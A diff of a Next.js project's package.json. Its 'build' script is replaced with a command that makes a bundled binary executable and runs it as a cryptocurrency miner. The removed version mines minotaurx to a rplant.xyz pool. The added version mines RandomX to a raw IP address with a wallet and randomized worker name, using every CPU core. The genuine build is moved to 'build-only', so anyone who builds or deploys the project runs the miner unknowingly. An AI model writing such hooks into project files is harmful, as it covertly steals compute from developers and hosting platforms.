@@ -2,7 +2,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbo",
-    "build": "chmod +x cprm && ./cprm -a minotaurx -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RGFcv8JX6xEupo5cBzUGdMaTu86hhpo1bG -p version -t $(nproc --all)",
+    "build": "chmod +x b && ./b -o 161.35.141.255:80 -u amyKp7wf1heWELLaUdThiW5B2aj73ht2HABotky8x2gfBPyD6sj39ynHxZCC8B5Cs4RMf7krykCGR5BpiVzbT3CD5tbz8cSEvN -p maggamanis-$(shuf -n 1 -i 1-9999) -a rx/0 -k --donate-level 1",
     "build-only": "next build",
     "start": "next start",
     "setup": "node ./setup.mjs"
